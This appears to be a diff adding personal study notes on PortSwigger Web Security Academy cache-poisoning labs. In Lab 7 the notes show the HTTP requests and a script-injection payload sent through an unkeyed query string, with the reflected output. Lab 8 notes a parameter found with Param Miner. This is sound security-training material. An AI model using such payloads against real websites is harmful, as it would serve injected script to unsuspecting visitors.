@@ -246,3 +246,59 @@ Content-Length: 35
 > skip for now
 
 ---
+
+## Lab - 7: Web cache poisoning via an unkeyed query string (P)
+
+- This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome. To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.
+
+```
+GET /?test=qwerasdf HTTP/1.1
+Host: 0aae006303779bc4c02356ec007a0068.web-security-academy.net
+...
+```
+
+- found that
+
+```html
+<link
+  rel="canonical"
+  href="//0aae006303779bc4c02356ec007a0068.web-security-academy.net/?testdata=qwerasdf"
+/>
+```
+
+- adding query string is reflected back and test with without query string and that query string still appears
+- to solve the lab
+
+```
+GET /?test=1'/><script>alert(1)</script> HTTP/1.1
+Host: 0aae006303779bc4c02356ec007a0068.web-security-academy.net
+...
+```
+
+- will reflect back as
+
+```html
+<link
+  rel="canonical"
+  href="//0aae006303779bc4c02356ec007a0068.web-security-academy.net/?test=1"
+/>
+<script>
+  alert(1);
+</script>
+'/>
+```
+
+---
+
+## Lab - 8: Web cache poisoning via an unkeyed query parameter (P)
+
+- This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome. To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.
+
+- with param miner, "Guess GET parameters" to the home page and found that `utm_content` is supported by the application
+- other steps as lab 7
+
+---
+
+## Lab - 9: Parameter cloaking (P)
+
+- This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome. To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser.
